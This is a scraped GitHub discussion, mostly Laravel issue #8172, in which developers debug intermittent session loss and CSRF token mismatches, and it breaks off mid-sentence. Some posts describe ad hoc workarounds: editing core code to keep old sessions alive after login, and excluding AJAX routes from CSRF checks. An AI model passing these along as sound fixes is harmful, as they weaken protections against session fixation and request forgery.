change homestead.rb to run it I have no idea who you would get homestead to do this  @friend You got the provisioning script in your project, which everyone uses? I don't understand, how you point invalidates provisioning per project for homestead?  I think the best you could get homestead to do is copy the files into you project for you and maybe be a wrapper around vagrant to tell you when you may need to provision again I would not be opposed to homestead being able to do that but it should be to do this as well as have it's original functionality ♠homestead init --localHomestead.yamlVagrantfilelocal mode` where is just runs vagrant in the current directory but if it doesn't find one of those files it runs it in the global version that would be cool but now this is just how vagrant works but with some sugar  ""just how vagrant works but with some sugar"" sounds perfectly fine to me. Homestead was (prior to version 2) essentially a Laravel-ready Vagrant configuration with some helpful wrappers around configuration and cli commands. There's nothing wrong with that; it was very useful. I've been happily using Purestead on recent projects anyway, so this isn't a massive issue for me (i.e. alternatives are available). I'm just not aware of a good argument for this change to a ""global Homestead"" in version 2. It's a lot of extra steps now to get my team on the same environment, and I don't see what's been gained.  You can also still use Homestead 1.  @friend I will have to find a source for this but the goal with Homestead was to have a way to quickly set up a new laravel site in vagrant and making a new box in vagrant is slow so put them all in the same box I think homestead is good for personal projects and tests eg trying out a new package or trying out a new concept I think @friend mentioned this in the lavavel podcast ep 19 but I could be wrong I will listen to it again and find out after work  If you want to have a look at how i think local installs of homestead could work have a look at laravel/homestead#173 just an idea discuss  I have been using a customized version of homestead after version 2 because of this issue, today this issue came to my attemption and made me figure other people shares this same opinion, so i open sourced my customized version  is basically homestead, no customizations at all, only simplified and per project based.  I think this global homestead is a step backwards, it makes it really hard to commit the dev environment to source control and for other devs to simply vagrant up and get cracking. Plus the provisioning script is running for every homestead up? Each project has it's own provisioning requirements....  Have to agree here, it seems a bit backwards. If we could add something similar to what @friend said above (check project folder first, then user folder) then that would be awesome.  I tried to talk to Taylor about it and he said that he though Homestead was ok as it is so if we want a feature like this we will have to fork  but there is already projects around that do this eg purestead and firestead I also don't think another homestead fork is a good idea   Sucks to hear that disappointed  so, no original homestead in bigger teams with multiple homestead projects for me ... -1  I feel bad about this too, but there is no way to please everyone... I don't know if the majority liked this new way, but seems to, as it's simpler... That's why forks exists, someone doesn't like the direction of the main project and fork and customize. We have two good alternatives, as @friend pointed, purestead and firestead, i haven't tested purestead but seems pretty good to me.  plus one I agree with many of the opinions stated in this thread. I love Homestead. I think it has been a great project but with Homestead 2, the added  directory has caused more problems than solutions for me. I don't really like having Homestead in 2 different directories either. I have started opting for other solutions but would prefer to stick with Homestead if possible.  ping @friend this is already achieved so probably you can close this.  Thanks @friend. ",57,0,383,0,0,223,21,
laravel/framework/8172,0.0545958275,laravel,framework,[5.0] Session Persistance Issues,47417,509,358,0,19,"6777 and #5416 still seem to be an issue, even for drivers other than .  // cc @friend, @friend, @friend, @friend, @friend, @friend,  We are experiencing token regenerating issue on Redis, I don't think it would be lock issue because redis is single thread and atomic, I used the method suggested in #6777 to debug and here is the log you can see that the token is regenerated out of nowhere. one more thing, when I was testing the application (sending many concurrent requests) on another tab I was not able to login!  maybe related to this said by @friend in #5416  I can confirm this is happening using the file driver as well as the memcached driver.  Ok I added some code to log when a session starts when it stops (saves) and when the cookie is sent and here is the result as you can see in the middle the session id is regenerated because I have tried logging in when sending concurrent requests, and as you can see while the session id is changed the other concurrent requests are using the prior id so on next response the cookie is rewrote and you're logged out. any idea what can make this happen?  After testing on multiple machines / configurations, I was able to notice that it happens only using homestead without nfs folder sync.  @friend why is this closed?  I tested this on Homestead v2.5 on my Windows 7 64bit box using VMWare. I tried using session drivers ,  and . I could not replicate despite doing thousands of AJAX requests. I'll keep trying some other methods...  I Taylor and I can't replicate this either, but it seems there are a good number of people that seem to have having this issue.  Could it have something to do with a change or bug in the latest PHP version? I'm using PHP 5.6.7 for both local development and my servers, and I have this issue on both. The rest of the setup is totally different (Windows/Debian, PHP server/nginx).  @friend - the issue has been known since at least Dec 2014. So it was earlier than PHP 5.6.4 But there must be some combination of PHP/Server/Laravel versions that is causing it. Or perhaps even the OS or Server. Perhaps if more people with the issue can post their system configs/versions - we might see a common setup between them that we can use to narrow down the issue?  I've tried further on a new Forge DigitalOcean box (lowest box - 512mb ram) - running PHP 5.6.7. I also tried with browsers Chrome41 + IE11 Still cant replicate (  Its happening for me under xampp 3.2.1, windows 7, php 5.6, mysql 5.5.34, apache 2.4.7 As well on windows 8.1, php 5.6, mysql 5.6.24, nginx 1.7.12  @friend @friend - what browsers are you testing with? (I know it shouldnt matter - but I'm trying to think of every possibility)  Firefox and Chrome.  @friend - which exact browser versions are you using? And what code are you running to cause this issue? If you run the code in  do you get the problem?  Home Pc Firefox 37.0.1 Chrome 41.0.2272.118 m Work PC Firefox Developer 39.0a2 (2015-04-06) Chrome 41.0.2272.118 m I'll test the code when I get home. It happens very inconsistently with both the general Auth + Sentinel.  My PC is running Windows 8.1, PHP 5.6.7, the PHP web server and Chrome 41.0.2272.118 m (64-bit). My first server is running Debian Sid, PHP 5.6.7 and nginx 1.6.2. My second server is running Debian Jessie, PHP 5.6.7 and nginx 1.6.2 also. @friend I've tried the code of issue #6777. I've run ~2500 queries without any mismatch (I checked the logs). I've also created a new Laravel 5 project and copied the added code into it, but can't reproduce it there either. Using my own Naxiz/L5-CSRF-TestCase@friend seconds after it, I get an exception after just 2 clicks.  The #6777 was created on my local OSX dev machine using homestead (don't remember the version though). We initially found the problem on our DigitalOcean servers created through Forge.  @friend @friend I can easily replicate this error on our server and on my local machine, they have different versions of php different os, etc., I use laravel 4.1, on login form I simply click or enter the submit button 20-30 times repeatedly fast. as you know even on login the csrf token does not change, but I get a token mismatch error on this situation.  @friend @friend @friend - can you visit this server - and tell me if you can make it fail  is using the exact fork of  - on a DigitalOcean server using Forge. I still cant replicate - but I'm wondering if you can make it fail?  We've been battling with this puzzle for 2 months now. On our busy production system, we get 2-3  per 24-hr period upon a simple form submission. During this same period we have ~150 succeed without issue. We've implemented very detailed debug logging and one pattern has emerged, which is browser related. Over the last 2 months, with 2-3 issues per-day, only these browsers have triggered the issue (by quantity, predominantly IE 11 and Android 4.4.* Chrome 41) Related SO question  have a Forge managed Linode with LEMP (nginx 1.6.2, php 5.6.6-1+deb.sury.org~trustyplus one and Laravel 5 up-to-date). So far, we have been unable to replicate in our testing on the said browsers. Here's an example log run for IE 10  Ping @friend @friend @friend @friend. Can you please see if you have the problem on this server   cant replicate - but I'm wondering if you can? Might help pinpoint the issue.  As far as I can see on that server specifically the issue doesn't seem to occur. But another issue that could be related is the fact the laravel session cookie seems to expire randomly, when it does a new session gets created like when you logout so you would lose that token?  @friend @friend @friend @friend @friend @friend  After a lot of investigation on the issue in our company, I came to this result, I hope it helps, first of all here is our environment specifications PHP 5.3.3 LARAVEL 4.1 OS centos 6 on server and os x mavericks in development environment APACHE 2 MYSQL 5.6.19 REDIS 2.4.10 PREDIS  0.8.* First of all it seems that the TokenMistmatch exception occurs in a varied different conditions, I nearly investigated all of them and was able to solve some of them, some depends on the logic behind the session and some can be bugs. In the following i will explain each situation that I have faced. 1. Expired sessions Let's say you have configured your session for 3 hours a user opens up a form and for some reason he leaves the computer (getting a cup of coffee) so after 3 hours when the session is expired he tries to submit a form and gets a token exception. this is why everyone once in while gets a token errror regardless of how much stable the application is, I can imagine of 2 ways to prevent it and they're renewing the session cookie using ajax on a timely basis, or increasing the session expire time to a considerable amount of time. 2. Concurrent requests when session is expired Sometimes on the load of your first page concurrent requests happen, for example the user has two different tabs open on chrome and when he reopens chrome chrome sends the requests simultaneously or you may have multiple concurrent ajax request on the load of the first page of your application. so note that the session cookie is received after the first response is received but you may send the next request before this happens and therefore you will get a new session (new cookie) on each requests, this can lead to token exception if one of these requests populates a form. you can prevent this scenario based on it's source, for example if the ajax request are causing the problem and you do not use session in ajax responses, you can disable sending the session cookie if the request is ajax, in the second scenario (clicking the submit button multiple times) you can simple disable the button once it's submitted. 3. Concurrent requests on login When login is occurred, laravel for security reasons changes the session id, copy the session data and DESTROYS THE LAST SESSION so let say for some reason when logging in concurrent requests happen (clicking the login button multiple times) so the session id would be regenerated multiple times and DESTROYS the last generated sessions in the server side, as some of these requests still use the prior session id (which does not exist in the server side anymore) it leads to regenerating the CSRF token, please note that normally laravel does not regenerate the token on login if it can find the token in guest (not logged in) session, but in this case as the guest session is destroyed as a result it will regenerate the token and it can result to token exception in other requests that are using the original token. also note that not only this issue can result in token exception it can also result in the user being logged out after one request, because the concurrent requests can change the logged in session. I solved this issue by changing one line in the laravel code, in  passing true to the migrate method of the session store will result in destroying the session on the server after migration, so now the data will remain on the server and destroyed on their expire time rather than on this request and it will solve the issue. I don’t know if we can call this a bug in laravel, but I guess we can come up with a better solution for this. 4. Browsers After investigating the logs it turned out that some of these token exceptions were because of the user’s browser not accepting the session cookie,I saw it the most on iOS Safari, I believe this is something we can do nothing about it. 5. Redis bug Some of the token exceptions on our sever was because of redis, for some reason laravel could not read the session data from the redis server when opening the session so it would result to the regeneration of the CSRF token. it was happening randomly on our server, so I tried changing the session driver and this type of exceptions faded away. I tried database, apc and file drivers and none produced this issue. I have not yet found what is causing the bug but i think it can be a bug with redis or the predis library. (as you know laravel 4.1 is not using the latest version of predis because of compatibility issues). Okay these are my experiences of the last 2 month working on this issue. I hope it may change your point of view regarding solution to this issue, the most important thing is that the token exception does not happen because of one reason it’s can be a result of multiple issue. please share with me if you have had similar incident or you have something new.  We're not interested in issues with 4.1. We're not interested with issues with PHP 5.3.  We want replication on Laravel 5.x.  This is because it doesn't pose a security issue so we have no intention to patch it on 4.1.x.  @friend I'm aware but I was trying to lighten things up, wondering if anyone can test the similar situations on 5, I'm also upgrading the laravel of my application so then I can try again with L5.  @friend Thank you. )  @friend I can't reproduce it on your server. I also set up a new server at DigitalOcean and can't reproduce it there either. I thought it may have something to do with the time zone, because it's Europe/Amsterdam on all machines I can reproduce the issue on, but not on DigitalOcean, but after changing it I still can't reproduce it.  I got the same issue, I get some data that appear and desappears randomly, I'm guessing that it's from  the ajax long polling in my app.  @friend Can you please provide your laravel version, php version, session driver and the driver version and the exact way you are able to replicate this issue (even with sample code). thanks.  Im not sure if this related to this issue, but my session variables are not saved in the file session. I tried to quickly reproduce it with the following code in the latest Laravel (5.1-dev) In the example i except to get a filled  with 2 messages, but unfortunately i do not. When i try this exact example within Laravel 5.0.22 its working properly. After some debugging and digging within the  it should save all attributes (with ). But somehow the function is not triggered, but the if-loop requirements are all valid.  @friend Laravel Framework version 4.2.17 PHP Version 5.5.12 Session driver 'file' This is a sample code of my long polling method in a regular Controller  Laravel 4.2 is not supported.  Yes - but this bug first appeared in 4.2 (or at least it was first reported then) - and has carried on into 5.0 - so it is still relevant to know of issues in 4.2. This bug is so elusive - yet it is clearly out there (with some many different server configs etc etc) - that the more info we get the better. We need as many reports as we can get. And knowing the bug exists in 4.2 helps to drill down the issue. There is obviously something common between 4.2 and 5.0 causing the bug?  @friend as @friend said the problem is common with v5.0, and what about applications running under Laravel 4.2 like my application which is production.  We are not supporting 4.2. If we do finally fix this, we will only be merging the fix into 5.0 or 5.1, depending in which one is stable at the time.  So I hope people can help to find the bug asap otherwise we all have to migrate to L6.0 or 7.0 because of this bug!  I was able to reproduce this bug. Laravel 5.0 PHP 5.6 (provisioned by Forge) Session drivers redis, file The race condition occurred due to images pointing to dynamic URL (image generation was handled by Laravel). Browser was processing the request, but also trying to load the images. The main request was updating the session, but on some cases the requests to images were resetting it. Consider this simple timeline R1 (SS)-------------(DP)-----------(SC) R2 --------------(SS)---------------------------(SC) Legend SS - session starts - data is read from the storage DP - data is put to the session SC - session is closed - data is written to the storage R1 - first request R2 - second request Since the second request has the old data it's writing them back to storage. I see two solutions for this  simple and naive - save session data only when they were changed session locking  In my case I've simply disabled session saving for image requests. What do you think about it?  That seems like a good optimisation to make anyway, though if people are storing large objects in the session, could be slow to check for changes.  @friend If we make that optimisation, it might be an idea to ditch the serialise/unserialise stuff and not support putting objects in the sessions. It seems like a silly idea to do that anyway?  To check for changes you could md5 the serialized array. On Tuesday, May 5, 2015, Graham Campbell notifications@friend.com wrote  I had another idea for this - make a flag (e.g  ) ), every call to ,  etc will mark it to . If so - session should be saved. Does this make sense?  Yeh, I guess. I was hoping for an optimisation where we could break out before we even serialised anything, since the serialisation process could actually take longer than storing the session in some cases.  That wouldn't work for objects. People can modify them by reference, so they never hit the put or push methods.  Maybe relevant  references the WriteCheckSessionHandler and a note  Hmm, that's a very important point.  There is this report on SO  cacheclear Flushes User Sessions. Is this Intended?"" It affects Redis according to the post. Might be related? i.e. we've been searching for session issues - but might be a related cache issue as well?  Yes. If you're using the same store for sessions as for cache, expect clearing the cache to destroy ALL data in the store.  @friend I'm the one who posted that (now deleted) question on SO. I was just looking for the confirmation Graham provided above. It wasn't related to the issue you guys are discussing here.  Yea happening to me as well. Same browser, two different environments one staging server, one my local. Everything works fine on local, however staging environment writes new session to file at every request. Both environments are Ubuntu 15, with latest servers and PHP-FPMs installed. From time to time my local messes up as well. But miraculously it fixes itself. None of the environments have more than 1 request per 10 secs ) So can't be a load/race-condition issue.  Okkk... Right now, I have this problem in both environments and I decided to dig in with XDebug. I will be posting my discoveries here. Note I am testing the case in both Chrome and Firefox (latest versions as of now). I have Firebug's latest beta version installed with Firefox to get latest features such as CSS-Maps etc. I also have my app under  and  domains set locally of course. I have set . I cleared all my cookies from both browsers before starting the tests and ran commands  +  + . Currently my observations are as following  Chrome console only shows  cookie only. No  cookies whatsoever. Firefox on other hand shows both  and  cookies. Both browsers renew these cookies and write new session file everytime I reload the page.     When debugged with XDebug, for line   actually detects no  cookies    as a value to  there. Same goes for Chrome as well  So I guess, none of the browsers actually detect  cookie. And if that cookie is not present, new session cookie will be written. Am I missing anything so far or doing something wrong, @friend  @friend ?  Additionally, I gathered cookies are not allowed to be set in top-level-domains (such as ) in Chrome - and from specs-viewpoint, that's the case. Firefox on the other hand, allows setting them for TLDs. Although my code is behind  domain, which isn't a TLD, I will setup some bogus real-looking domain and test it again.  @friend @friend  I just noticed - please check the screenshot from Firefox above and notice domains of  cookie. It is not the domain app works with, but rather .  Is this only happening when you're using environments? Try hard coding all your config.  Question I am not Symfony guru, but as I am currently searching for the cause of  cookie being set from  domain in some cases no matter what you do, I stumbled upon  unit-test method in Symfony. Question is is there a chance Symfony resolves the name (our domains, in case of locals and staging areas, our rather FAKE domains which always resolve to 127.0.0.1) to IP address and when it finds out that IP address is rather local, sets  cookies under ? It's just a hunch, nothing substantial to back it up right now. @friend  Ok, I will hard-code configs. I was using  file.  Meanwhile my  file   We're already aware of concurrency issues with the environment system. I'm wondering if this session issue is actually just this same issue, applied.  @friend Just a word of warning might want to take down that screenshot of your .env file its got your Google and Twitter OAuth details in, might want to obfuscate them before uploading it again.  @friend Bit late for that. They'll need invalidating.  No worries folks, they are for dev purposes, can be invalidated in a whim. )  @friend , I changed to  in  config file. Results are the same.  I'm meaning, don't use the env system at all for any config and see what happens.  @friend fixed the problem. Value  inside  file must be set correctly. I set it the same value as my fake real-looking domain - in my case  - and session is working now. Setting that value as  and accessing the app from  domain does NOT work in Chrome (as per aforementioned reason cookies are not designed for TLDs and Chrome follows that rule), but works in Firefox. Setting it to  (fake domain I used for my project in general) works as well. To those who work with Socialite, be warned since Twitter doesn't accept  and G+ doesn't accept unreal domains like   in callback-URIs, you should be working with real-looking domains to avoid all these problems altogether.  Or we could just set that line like  and move that setting to dotEnv?  @friend - setting the domain to solve your session problem doesnt sound like rest of the problem the rest of us are having. We have random session fails, sometimes under heavy load from AJAX. But our sessions work most of the time. Yours doesnt - so it would seem to be a different issue than discussed here unfortunately.  @friend Yea, I think it might be. That might be related to that ""race-condition"" topic mentioned before, I guess. Or something related to  not locking file before reading (which would clearly break concurrency in session handling). @friend , I believe my posts might have diverted this discussion away from original topic/problem at hand. If you guys believe this is the case, please feel free to delete my posts and put one tiny notification for those who would have the same problem I did today. No need to clutter this topic, if my posts are close to irrelevant.  I suspect that's caused by the env system. Can anyone confirm this?  @friend - if people run  - would they still be subjected to env system concurrency issue? I'm guessing not?  True. Are people still experiencing this after caching the config?  That is, with drivers other than file. People were complaining of issues with redis too?  Ping @friend @friend @friend @friend @friend Are you running Laravel 5? If yes - are you using ? If not - can you try and use that feature (which is helpful in production anyway) and see if the problem continues?  @friend that would make sense. If the putenv was being unset for that second request, the Encrypter wouldn't be using the correct app key to decrypt the cookie. Here are the relevant threads  We aren't using configcache at all. Not any other caching in our development environments. Although since I switched to redis the issue has stopped happening.  I think this is pretty much sorted. To avoid this bug, use config caching and a driver that's not ""file"".  The ""file"" driver was never intended for large scale production use.  It does apparently fail with a few concurrent AJAX requests (on a single page), which has nothing to do with production...  What does. Does redis fail after using configcache first?  The file driver.  We already know that's broken, and it's not getting fixed. That wasn't the purpose of this issue. Look at the very top.   I opened this to investigate drivers other than the file one because there's no way they should be failing, and that seems to be resolved. Taylor already rejected the overly strict file driver fixes. The recommended advice would be to not use the file driver.  I discovered the bug using the database driver, so it’s certainly not only the file driver. It seems it doesn’t matter whether is use the file or database driver. From Graham Campbell [mailtonotifications@friend.com]  Sent 18 May 2015 2254 To laravel/framework Cc Louis Matthijssen Subject Re [framework] [5.0] Session Persistance Issues (#8172) I opened this to investigate drivers other than the file one because there's no way they should be failing, and that seems to be resolved. Taylor already rejected the overly strict file driver fixes. The recommended advice would be to not use the file driver. — Reply to this email directly or view it on GitHub  .   @friend did you also try caching your config?  I did, and I got a TokenMismatchException after just a few submits using my own test case. These are not even AJAX or concurrent connections. Unfortunately I don’t have much time to look into this issue myself at the moment, I’ll report back if I find anything useful later.  @friend so given that it seems to remain unclear whether this is related to dotenv.  @friend As I said, we're not interested in the file driver. We already know it's limited.  I'm using config caching, but still I have session persistence issues. Session in not being stored sometimes (randomly). Both on  and  drivers.  This is causing us quite a lot of headache, days of debugging and the problem turns out to be a session handing in laravel /  What driver?  We tried both  and  plus config caching enabled  To add to the pain, issue is intermittent. So we get 3 invalids in 30 tries.  3 invalid what?  @friend how rapid are requests? Are you making them in quick succession or are they spaced out?  @friend knows better, I've been following development only from the managers perspective. @friend  no pattern there really. lets say 5 secs &lt;-&gt; 15 secs. I also noticed that on windows+chrome combination it was easier to reproduce problem than on mac+chrome, but this could have been pure coincidence. Also number of users/sessions seemed to have worsened the problem. @friend bad wording on my part, we store specific key in the user session. In rare occasions 3 out of 30 this wasn't set correctly. But as I said @friend knows better, so lets wait for his insight.  @friend I'm having this issue with the  driver, also with the config caching. Also, there is at least 5 seconds between the requests but it still happens.  The issue appears at nearly no concurrent requests. I mean just me testing on homestead. Session is not being saved sometimes. Simplified TL;DR I set session key  to a certain value ( of post) in  route. I have also  where I output the value of . Sometimes the value is old one, I mean session key isn't being saved. Issue remained when we switched to redis as a session driver and enabled config caching. The only solution I figured out, is that now I'm saving its' value in  field on user object and it works fine.  @friend can you try to create just a simple GET route that you hit repeatedly with a page refresh until you get the problem? I'm trying to determine if the problem is related to multiple concurrent AJAX requests in certain environments.  I think we're particularly interested in a demo application that can recreate the problem in Homestead using the Redis or Memcached driver. On Fri, May 22, 2015 at 344 PM, Jan Hartigan notifications@friend.com wrote  @friend I reproduced it and as @friend said, it fails when I rapidly hit ""get"" route with browser refresh. Demo app I created a demo app at my local homestead   code Example  How to reproduce Open two tabs as shown on screenshot above. Hit  route once to set random number. Then refresh the same page and then rapidly hit  route (Click ⌘+R several times quickly). Value remains the same (old) in get route. I'll try to record a video now.  @friend so just to clarify...you can't replicate the problem without rapid refreshes?  @friend I'll tried now (~50 tries) and couldn't. I only replicated when I refreshed  quickly. It seems like the problem occurs when the following happens  started saving to session. ( route) read the value. ( route) finished saving to session. ( route)   @friend looks suspiciously like the multi-thread problem, but I can't imagine how that would matter when config is being cached.  @friend Here's a video I just recorded  Redis Config cached Environment Homestead 2.0.7  Trying to figure out what you are showing in that video. Are you trying to demonstrate at the end how your value gets stuck on that single integer? On Fri, May 22, 2015 at 426 PM, Levan Velijanashvili  notifications@friend.com wrote  Exactly. Take a closer look at active windows (can be seen using window shadows) and refresh buttons.  I refresh  route. Prints generated random number and sets it to session. Then I gently refresh  route that outputs value from session (see code posted by me above) I repeat this action again and everything still seems to be fine. Then I refresh  route again, quickly switch to  and rapidly hit CMD+R several times. route outputs new random number it set to session. Then I gently refresh  route several times with normal intervals and the see the value is the same as it was in step 3.   I can't recreate the issue @friend is talking about... I do the cmd + R thing as fast as I can and i see it refreshing, but then if I set a new number to the session, refreshing  again gets the new value correctly.  @friend You should start rapidly hitting  before  finishes its work and outputs new value. I'm doing it at 008-018 in the video  Did that too... I can't recreate it.  I thought this was solved by switching to redis, but today I was randomly getting this issue as well, not even spamming my system, just generally browsing though it and it came up with TokenMismatchException and the session was gone.  1) I did open this page on first window  and this one on the other window  pressed cmd + r on the first window for more than 30 times 4) refreshed the second window and the numbers were different  @friend I think you're doing different thing. You should refresh  to set a new value to session and until it returns the result, you should refresh  several times quickly. During your refreshes the  will set a new value to session (but will fail silently). You continue refreshing  route and the value remains unchanged, i.e.  didn't really set the value to session. /cc @friend  I think this thread is sort of becoming a dumping ground for anyone who has any random issue with the session. /  @friend your right! did the same test this time and got different numbers  @friend this is not a random issue, the problem is real, and quite annoying, recreated by number of people here. We can go in two directions from here, pretend that there is no problem and continue with our lives, or actually acknowledge its existence and do something about it.  Maybe it's a hardware/environment problém ? because I can't reproduce the issue  @friend I think it's from the service that you are using (localtunnel.me) I think it's caching or somthing like that, try at localhost  @friend we can reproduce problem on homestead+mac. And ubuntu 12.04 LTS VPS.  @friend I really tried many times without any problem  on Windows 8.1 WAMP server  Nobody is denying the problem is real. If you are repeatedly changing the session on each GET request, you're going to possibly get stale data. The only way around that is to makes the sessions totally blocking, which we don't want to do, or to tweak your app to not write to sessions on idempotent requests like GET. On Saturday, May 23, 2015, Ala RIHANE notifications@friend.com wrote  No, I'm not changing anything on  request. I just read data and output it. Session in changed on  request which I hit only once while replicating issue.  What do you mean session is changed? If you do a set request but a get request starts before that request AND then finished after the set, the get request is going to write the stale data back to the session. On Saturday, May 23, 2015, Levan Velijanashvili notifications@friend.com wrote  @friend ""session is changed"" I mean value of a key in session is changed. So that's the problem. I'll paste the code @friend posted in Slack chat yesterday So the problem is that session data is being written back at the end on every request, whether or not session data was changed. So the only fix would be to write back session data only if session data was changed during current request. Note The problem will still occur if we re-read session data at the end of the session. It will see data was changed - it will compare newly read data to one that we read at the beginning, so it will still write back stale data. We should write back session data, only if  (or any other method that changes session data) was called. As @friend says, it will make the expiration stuff complicated. So at this moment I don't know how to avoid this problem.  I understand that expiration stuff can become a problem when session is saved only on change. For year's (before Laravel) I've been using this solution in our company framework. It was used on pages with big traffic, and we didn't experience any problem with sessions being expired due not saving any data to it. I think that this is a risk worth taking.  It is sort of a problem though. If I log into the site and I work in the app all day. I don't want to be logged out every two hours just because my session hasn't changed. That's silly. On Saturday, May 23, 2015, Radosław Mejer notifications@friend.com wrote  And what about the touch() function? Would that still corrupt the file? It would prevent the session going stale, right? if ($dataChanged) {     writeSession(); } else {     touchSession(); }  Or take the time into consideration, only update once a minute? if ($dataChanged || $secsAgoChanged &gt; 60) {     writeSession(); }  Or combine both? if ($dataChanged ) {     writeSession(); } elseif ($secsAgoChanged &gt; 60) {     touchSession(); }   The seconds thing will be error prone. To me it makes more sense to just evaluate why is the session changing in s particular app and perhaps structure your AJAX calls to where they aren't going to be going in between set requests for the same session. Perhaps use a cookie to store a piece of data, etc On Saturday, May 23, 2015, Barry vd. Heuvel notifications@friend.com wrote  @friend What about long-polling? It will screw up thing if someone has long-polling implemented in app.  What will screw up things? On Saturday, May 23, 2015, Levan Velijanashvili notifications@friend.com wrote  This issue. I mean if you change anything in session data, long-polling requests will overwrite stale data to session as each polling request will take up to 40 seconds.  I mean there are several options there. You could send a custom header, check for that header, and then override the session middleware. That's just off the top of my head. I'm not sure of a really great solution that works well in every situation. On Sat, May 23, 2015 at 257 PM, Levan Velijanashvili  notifications@friend.com wrote  Also worth mentioning that the near-term future of bidirectional communication likely won't include long-polling unless your app needs to support IE9.  I'm not sure I fully understand the ""expiration"" problem, but if it's a case that the session must save at certain intervals to avoid being logged out, how about using the garbage collection/lottery approach to save the session occasionally? Or maybe just add a session save in the ""gc"" function of the session handler?  @friend when it comes to long-polling it's a big problem, I used to store data from Session data while there is a long-polling ajax request, the Session forget even in the same request, so we suitched to cookies so we didn't faced this problem anymore.  Same issue here running L5 on PHP 5.6.9. - TokenMismatchException VerifyCsrfToken.php on line 46 - on every post request. Works fine on PHP 5.4.  We are running it on PHP 5.5.24-1  @friend  Yea, it happens because Session is re-initialized on every request (make sure you have set the domain-name setting in  btw).  We have exactly the same problem. Weird thing is we can not reproduce it ourselves but we have Bugsnag installed and see the tokenmismatch exception pop-up twice per minute or so, completely random. Random users, random computers, random browsers. Only thing in common is that it where all ajax calls. Seems like about 0,1% of all ajax calls return a token mismatch exception, all the ajax calls suffer from this. I know that it has nothing to do with a session expiring because we have one ajax call which is only loaded first thing when a page loads and even this ajax call will return a tokenmismatch exception about 0,1% of the time, again completely random but here at our office we can not reproduce it. If somebody wants access to the Bugsnag report, I can give you that for investigation purposes. Environment AWS Beanstalk (64bit Amazon Linux 2015.03 v1.4.1 running PHP 5.6) Latest Laravel 5.0.x Website www.studocu.com We used to have 1 AWS redis node for both the cache and sessions. Today we tried separating the 2 and moved the session part to a newly setup memcached node, but this didn't make a difference and the problem still exists.  Experiencing this issue with a fresh install of Laravel 5 on a recently provisioned Ubuntu 15.04 server. No matter what route, it's always a token mismatch. Tried both file and database session drivers. I'd be willing to let @friend or @friend or someone else into the server to poke around and see if they can figure it out.  @friend -You have a complete session failure - which is a different issue to this thread. Please post that issue in a forum for assistance.  Can people stop abusing this thread and actually read it, and only comment if they have something useful to say.  @friend Was this comment meant for me? If so, how can I provide more information?  @friend Open independent issue for your case, because it is not related to this one (this one = random, unpredictable and untraceable session failures [0.1-0.3% occurrence rate]).  @friend Did you even read my report? I'll quote myself ""Seems like about 0,1% of all ajax calls return a token mismatch exception, all the different ajax calls suffer from this. Random users, random computers, random browsers"". This is caused by a random, unpredictable and untraceable session failure and thus a session regeneration causing random (0,1% of all) ajax calls to return a tokenmismatch.  I had a problem with persisting sessions. (Not sure if its related to this problem). The first time I installed Laravel via installer, then I had problems running phpunit and the weird session persisting problem. Then I reinstalled Laravel via composer and now everything works as expected. Perhaps its a bug in the installer.  I had a problem with session persistence only on live server, but I solved it. The problem was in blank space after php closing tag in my Profile model which I using  for authentication. After I removed it everything is work now.  That is totally unrelated! Also, you should not use php closing tags for that reason.  Been following this thread for a while hoping for a solution. I just bumped into a situation which might be related to this. (Using the database session driver) Accidentally I put a wrong route for a form and when I submitted I obviously got a TokenMismatch even on valid routes from time to time on fast AJAX requests or situations where there been many concurrent requests. And after that I've seen this NotFoundHttpException the second time on submitting a form to an invalid route instead of a Not Found page. Is that expected behavior?  CSRF token checks run as part of the global middleware, before you reach the routes. So an invalid CSRF will trigger an exception, regardless of the url.  Yeah I got that, just didn't understand why a csrf exception was triggered after a not found exception the first time.  Ok figured that whenever hit a NotFoundHttpExceptionTokenMismatchException♠` is triggered. Is it necessary to clear the session / regenerate the token if a route is not found?  Hi! I have the same problem. The session of my app expired when I do new request. In a local environment that's fell good but in a real hosting the session expires randomly, someone have some hint?  I started getting this today after several days of development. Laravel 5.1 Windows 8.1 Google Chrome Version 43.0.2357.124 m PHP Version 5.6.8 Notable information  Only happens on my Chrome browser (Tested latest IE and latest FF) It happens in incognito mode as well I get the error more often than not (About 90% of the time I submit a form) It does not appear to have anything to do with the frequency of form submissions It happens in both prod and local APP_ENV   I have the same problem and here is how i'm tested and fixed the problem. First, i knew i have some 404 ajax and resources ( javascripts ) on my site. So I logged on the site, and put four tabs opened with my site in firefox. The Firefox has a nice tool called ""Reload all tabs"". So I did it and with a few refresh all tabs I get logout. Then, I removed all 404 requests and tried again, and, after 20 attempts, no logouts from now.  @friend I don't know why it works sometimes, but when I get 'the error' it's because the form is sending a different (Seemingly random) token than what is stored in the session. Are you sure this is not the same issue?  @friend so it's expected behaviour for session and token to get refreshed after a 404? Any reason for that being necessary or that just the way it's made? And some times a 404 is triggered even on valid routes? That's what seems to happen in my environment randomly...it's actually first a ""Whoops something went wrong...notfoundexception"" followed by tokenmismatch...on fast ajax requests...and hence guessed that this could be issue others are facing..and just wanted a way to ensure that even if 404 did come about, the token does not get refreshed...is there any way to ensure that  it doesn't get refreshed on 404 then my problem will be solved at least ;) because I can't figure why I get a notfound sometimes on valid routes, it's rare but happens and then it results in this tokenmismatch....  @friend What? Why would your session get refreshed after a 404? This is not true, and I've just confirmed in a clean install. Also, that would be a horrible user experience, because users would basically be logged out after visiting a missing page.  @friend Sorry my bad, was getting frustrated about everybody just commenting their issues in here. Of-course a 4xx will not refresh your session. I do not have any reponses other then 200, I do not have concurrent and high frequency ajax calls. No exceptions are being thrown (we log everything on bugsnag). Still once in a while, about 0,1%, a request is returning a tokenmismatch caused by a regeneration of the session (i've actually logged this), not caused by session expiring or any thing like this. We have this problem both on Redis and Memcache. This is actually influencing the user experience on our website! Since this is only happening on our production environment (we can not reproduce the problem on develop or staging). I had to exclude all vital ajax routes from CSRF verification. Since nobody is interested in our bugsnag report or logs it kinda feels like nobody is working on this issue and people are only cluttering this thread with non related issues. This problem is actually costing us users and thus money and is kind of unacceptable. (it is the only laravel issue we are having btw, everything else works like a charm and is awesome!)  @friend - what exactly is your production environment config? i.e .server, os, php version etc?  @friend Environment AWS Beanstalk (64bit Amazon Linux 2015.03 v1.4.1 running PHP 5.6) PHP 5.6.8 Apache 2.4.12 Latest Laravel 5.0.x Website www.studocu.com Weird thing is we have a replica of this setup for staging and we can not reproduce it there as well. I guess with just 7 dev's working on staging we do not have enough ajax calls to get a single error. On production though we hundreds of users online at the same second.  @friend - so here is an idea; Can you 'duplicate' that AWS environment? Put a copy of your app on it - and 